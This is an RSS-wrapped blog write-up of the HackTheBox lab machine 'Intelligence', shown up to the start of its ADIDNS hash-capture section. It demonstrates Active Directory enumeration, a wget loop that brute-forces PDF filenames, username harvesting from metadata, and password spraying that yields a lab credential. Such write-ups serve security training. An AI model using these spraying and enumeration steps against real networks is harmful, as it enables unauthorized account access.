<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>BloodHound on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/bloodhound/</link>
    <description>Recent content in BloodHound on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 19 Sep 2022 01:01:51 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/bloodhound/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Intelligence</title>
      <link>https://fahmifj.github.io/hackthebox/intelligence/</link>
      <pubDate>Mon, 19 Sep 2022 01:01:51 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/intelligence/</guid>
      <description>Intelligence brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&amp;rsquo; metadata returns a valid combination. There&amp;rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under intelligence.</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Intelligence/">Intelligence</a> brings some cool enumeration and exploitation techniques to own Active Directory. It starts off by enumerating a website and run a brute-force attack against it to retrieve a bunch of PDF files, one of which contains a default password for new account. Spraying the password to a list of usernames gathered from the PDFs&rsquo; metadata returns a valid combination. There&rsquo;s a scheduled PowerShell which sends a HTTP request to any subdomain under <code>intelligence.htb</code>. By creating a new subdomain record, it is possible to capture the requester&rsquo;s hash and it can be cracked. With Bloodhound, it reveals the user can retrieve GMSA password of a service account where it has delegation privilege on the AD domain. These two can be abused to own this box.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>User enumeration via file metadata</li>
<li>ADI DNS attack</li>
<li>AD</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Impacket</li>
<li>BloodHound</li>
<li>dnstool.py</li>
<li>gMSADumper.py</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Port scanning with <code>nmap</code> reveals a bunch of ports open. Some interesting ports to dig into here are 445, 389, and 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49423,49667,49691,49709,49714 -sC -sV -oA nmap/10-tcp-allport-script-intelligence 10.10.10.248
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-14 00:22 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.248
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.30s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intelligence
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2021-07-14 11:22:29Z<span class="o">)</span>
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:04+00:00<span class="p">;</span> +7h00m03s from scanner time.
</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: intelligence.htb0., Site: Default-First-Site-Name<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-04-19T00:43:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-07-14T11:24:03+00:00<span class="p">;</span> +7h00m02s from scanner time.
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span class="line"><span class="cl">49423/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">49709/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49714/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled and required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-14T11:23:25
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 104.01 seconds
</span></span></code></pre></div><p><code>Nmap</code> results also reveal the some domain names. I&rsquo;ll add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">10.10.10.248 dc.intelligence.htb intelligence.htb
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445139---smb">TCP 445,139 - SMB</h3>
<p>When approaching an AD box, I would definitely check for anonymous login on SMB, and it&rsquo;s allowed but nothing here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.248/
</span></span><span class="line"><span class="cl">Anonymous login successful
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
</span></span><span class="line"><span class="cl">        ---------       ----      -------
</span></span><span class="line"><span class="cl">SMB1 disabled -- no workgroup available
</span></span></code></pre></div><h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can only retrieve the naming contexts.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -s base namingContexts
</span></span><span class="line"><span class="cl">dn:
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">namingContexts: <span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -x -h 10.10.10.248 -b <span class="s2">&#34;dc=intelligence,dc=htb&#34;</span>
</span></span><span class="line"><span class="cl">Operations error <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Additional information: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this operation a successful <span class="nb">bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The website hosted on this machine is a static site with no further information to dig in.</p>
<p><div class="img-container"><img src="imgs/image-20210714112254614.png" alt="image-20210714112254614"  /></div>
</p>
<p>On the next section, there are two download buttons.</p>
<p><div class="img-container"><img src="imgs/image-20210714112325301.png" alt="image-20210714112325301"  /></div>
</p>
<p>These download buttons point to two PDF files.</p>
<p>PDF 1: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113015135.png" alt="image-20210714113015135"  /></div>
</p>
<p>PDF 2: <code>http://intelligence.htb/documents/2020-01-01-upload.pdf</code></p>
<p><div class="img-container"><img src="imgs/image-20210714113121646.png" alt="image-20210714113121646"  /></div>
</p>
<p>The document properties show each file has different creator.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-tifannymolina">Access as Tifanny.Molina</h3>
<h4 id="grabbing-more-pdfs">Grabbing more PDFs</h4>
<p>Seeing the filename with pattern <code>YYYY-MM-DD</code> eventually led me to think &ldquo;Will incrementing the date give me another pdf?&rdquo;. The answer is yes, it does give me another pdf!</p>
<p><div class="img-container"><img src="imgs/image-20210716081606506.png" alt="image-20210716081606506"  /></div>
</p>
<p>This time, I can try to use the following script to simply brute-force the filename with YYYY-MM-DD pattern.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># $ bash loot_pdf.sh</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> month in <span class="o">{</span>01..12<span class="o">}</span>
</span></span><span class="line"><span class="cl"> <span class="k">do</span> 
</span></span><span class="line"><span class="cl">  <span class="k">for</span> day in <span class="o">{</span>01..31<span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">     wget -q <span class="s2">&#34;http://10.10.10.248/documents/2020-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl"> <span class="k">done</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210716083456661.png" alt="image-20210716083456661"  /></div>
</p>
<p>Or much simpler one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ wget -q http://10.10.10.248/documents/2020-<span class="o">{</span>01..12<span class="o">}</span>-<span class="o">{</span>01..31<span class="o">}</span>-upload.pdf
</span></span></code></pre></div><h4 id="harvesting-username-via-pdf-metadata">Harvesting Username via PDF Metadata</h4>
<p>Now we can just harvest the creator name from the PDF files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ exiftool * <span class="p">|</span> grep -i creator <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2 <span class="p">|</span> sort <span class="p">|</span> uniq <span class="p">|</span> tee ../users.list 
</span></span><span class="line"><span class="cl">Anita.Roberts
</span></span><span class="line"><span class="cl">Brian.Baker
</span></span><span class="line"><span class="cl">Brian.Morris
</span></span><span class="line"><span class="cl">Daniel.Shelton
</span></span><span class="line"><span class="cl">Danny.Matthews
</span></span><span class="line"><span class="cl">Darryl.Harris
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The first idea to come with this username list is to perform <a href="/hackthebox/forest/#asrep-roasting">AS-REP Roasting</a> attack. I tried it but no luck there.</p>
<h4 id="pdf-content-examination">PDF Content Examination</h4>
<p>By examining the pdf files manually, I found two non-<em>lorem ipsum</em> PDFs.</p>
<p>The first one is <code>2020-06-04-upload.pdf</code>, it contains the default password for new accounts in Intelligence Corp.</p>
<p><div class="img-container"><img src="imgs/image-20210716090147601.png" alt="image-20210716090147601"  /></div>
</p>
<p>The second one is <code>2020-06-04-upload.pdf</code> which contains some internal information that will be useful later.</p>
<p><div class="img-container"><img src="imgs/image-20210716084253574.png" alt="image-20210716084253574"  /></div>
</p>
<h4 id="password-spray">Password Spray</h4>
<p>With a list of usernames and a password, I can try password spraying attack via <code>rpcclient</code>.  It returns one valid pair <code>Tiffany.Molina:NewIntelligenceCorpUser9876</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ rpcspray users.list password.list 10.10.10.248 <span class="p">|</span> grep -v <span class="s1">&#39;NT_STATUS_LOGON_FAILURE&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Anita.Roberts:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Baker:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Brian.Morris:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Tiffany.Molina:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl">Account Name: Tiffany.Molina, Authority Name: intelligence
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Travis.Evans:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;Veronica.Patel:NewIntelligenceCorpUser9876&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying: <span class="s1">&#39;William.Lee:NewIntelligenceCorpUser9876&#39;</span> 
</span></span></code></pre></div><h4 id="smb-revisit">SMB Revisit</h4>
<p>Running <code>smbmap</code> shows list of share that are accessible by Tifanny.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.97» 
</span></span><span class="line"><span class="cl">$ smbmap -H 10.10.10.248 -u <span class="s1">&#39;Tiffany.Molina&#39;</span> -p <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> IP: 10.10.10.248:445        Name: dc.intelligence.htb                               
</span></span><span class="line"><span class="cl">        Disk                                                    Permissions     Comment
</span></span><span class="line"><span class="cl">        ----                                                    -----------     -------
</span></span><span class="line"><span class="cl">        ADMIN$                                                  NO ACCESS       Remote Admin
</span></span><span class="line"><span class="cl">        C$                                                      NO ACCESS       Default share
</span></span><span class="line"><span class="cl">        IPC$                                                    READ ONLY       Remote IPC
</span></span><span class="line"><span class="cl">        IT                                                      READ ONLY
</span></span><span class="line"><span class="cl">        NETLOGON                                                READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        SYSVOL                                                  READ ONLY       Logon server share 
</span></span><span class="line"><span class="cl">        Users                                                   READ ONLY
</span></span></code></pre></div><p>It turns out I can read the flag from the <code>Users</code> share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/Users -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls 
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 21:20:26 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 21:20:26 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  Administrator                       D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:18:39 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  All Users                       DHSrn        <span class="m">0</span>  Sat Sep <span class="m">15</span> 03:21:46 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  Default                           DHR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 22:17:40 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  Default User                    DHSrn        <span class="m">0</span>  Sat Sep <span class="m">15</span> 03:21:46 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  desktop.ini                       AHS      <span class="m">174</span>  Sat Sep <span class="m">15</span> 03:11:27 <span class="m">2018</span>
</span></span><span class="line"><span class="cl">  Public                             DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:18:39 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  Ted.Graves                          D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 21:20:26 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  Tiffany.Molina                      D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444286</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls Tiffany.Molina<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">  .                                  DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                 DR        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:51:46 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  user.txt                           AR       <span class="m">34</span>  Thu Jul <span class="m">15</span> 08:17:40 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444029</span> blocks available
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="access-as-tedgraves">Access as Ted.Graves</h3>
<h4 id="it-share">IT share</h4>
<p>On the <code>IT</code> share, there is a PowerShell script called <code>downdetector.ps1</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ smbclient //intelligence.htb/IT -U <span class="s1">&#39;Tiffany.Molina%NewIntelligenceCorpUser9876&#39;</span>
</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> ls
</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">  downdetector.ps1                    A     <span class="m">1046</span>  Sun Apr <span class="m">18</span> 20:50:55 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="m">3770367</span> blocks of size 4096. <span class="m">1444112</span> blocks available
</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> mget downdetector.ps1 
</span></span><span class="line"><span class="cl">Get file downdetector.ps1? y
</span></span><span class="line"><span class="cl">getting file <span class="se">\d</span>owndetector.ps1 of size <span class="m">1046</span> as downdetector.ps1 <span class="o">(</span>0.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.6 KiloBytes/sec<span class="o">)</span>
</span></span></code></pre></div><p>The content of <code>downdetector.ps1</code> reveals this script is used to send a HTTP request every 5 mins.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Check web server status. Scheduled to run every 5min</span>
</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span> 
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$record</span> <span class="k">in</span> <span class="nb">Get-ChildItem</span> <span class="s2">&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">Name</span> <span class="o">-like</span> <span class="s2">&#34;web*&#34;</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nv">$request</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://</span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2">&#34;</span> <span class="n">-UseDefaultCredentials</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(.</span><span class="n">StatusCode</span> <span class="o">-ne</span> <span class="n">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nb">Send-MailMessage</span> <span class="n">-From</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-To</span> <span class="s1">&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> <span class="n">-Subject</span> <span class="s2">&#34;Host: </span><span class="p">$(</span><span class="nv">$record</span><span class="p">.</span><span class="n">Name</span><span class="p">)</span><span class="s2"> is down&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>If I re-query this line <code>DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb</code> with a filter of <code>name=web*</code> using <code>ldapsearch</code>, it returns the following record.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class="line"><span class="cl">$ ldapsearch -LLL -D <span class="s1">&#39;Tiffany.Molina@intelligence.htb&#39;</span> -w <span class="s1">&#39;NewIntelligenceCorpUser9876&#39;</span> -x -h 10.10.10.248 -b <span class="s2">&#34;DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> <span class="s2">&#34;name=web*&#34;</span>
</span></span><span class="line"><span class="cl">dn: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>intell
</span></span><span class="line"><span class="cl"> igence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">objectClass: top
</span></span><span class="line"><span class="cl">objectClass: dnsNode
</span></span><span class="line"><span class="cl">distinguishedName: <span class="nv">DC</span><span class="o">=</span>weboops,DC<span class="o">=</span>intelligence.htb,CN<span class="o">=</span>MicrosoftDNS,DC<span class="o">=</span>DomainDns
</span></span><span class="line"><span class="cl"> Zones,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">instanceType: <span class="m">4</span>
</span></span><span class="line"><span class="cl">whenCreated: 20210716071327.0Z
</span></span><span class="line"><span class="cl">whenChanged: 20210716071707.0Z
</span></span><span class="line"><span class="cl">uSNCreated: <span class="m">102869</span>
</span></span><span class="line"><span class="cl">uSNChanged: <span class="m">102872</span>
</span></span><span class="line"><span class="cl">showInAdvancedViewOnly: TRUE
</span></span><span class="line"><span class="cl">name: weboops
</span></span><span class="line"><span class="cl">objectGUID:: JGYq3NUoGU24w9fR4hg/6Q<span class="o">==</span>
</span></span><span class="line"><span class="cl">dnsRecord:: <span class="nv">CAAAAAUAAABMAAAAAAAAAAAAAAAAAAAA9mT1lRJ61wE</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">objectCategory: <span class="nv">CN</span><span class="o">=</span>Dns-Node,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>intelligence,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">dSCorePropagationData: 16010101000000.0Z
</span></span><span class="line"><span class="cl">dNSTombstoned: TRUE
</span></span><span class="line"><span class="cl">dc: weboops
</span></span></code></pre></div><p>The script basically looks for any DNS record that starts with <code>web*</code>. For each record it finds, the script will check if the record is alive by issuing an HTTP request and if the response is not 200, the script will notify Ted Graves via email.</p>
<p>The key take away here is the wildcard (<code>*</code>).</p>
<h4 id="stealing-ntlmv2-response-via-adidns">Stealing NTLMv2 Response via ADIDNS</h4>
